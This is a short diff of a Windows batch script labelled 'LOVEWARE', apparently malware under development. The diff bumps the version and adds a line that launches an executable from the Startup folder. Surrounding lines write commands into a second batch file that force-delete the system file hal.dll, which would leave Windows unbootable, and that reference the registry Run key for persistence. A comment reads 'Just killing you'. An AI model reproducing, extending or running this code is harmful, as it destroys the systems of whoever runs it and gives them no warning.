@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.3
+:: LOVEWARE v7.4
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -598,6 +598,7 @@ echo timeout 400>>LoveChoice.bat
 
 :: Just killing you
 
+echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe>>LoveChoice.bat
 echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveChoice.bat
 echo @((( Echo Off > Nul ) & Break Off )>>LoveChoice.bat
 echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveChoice.bat
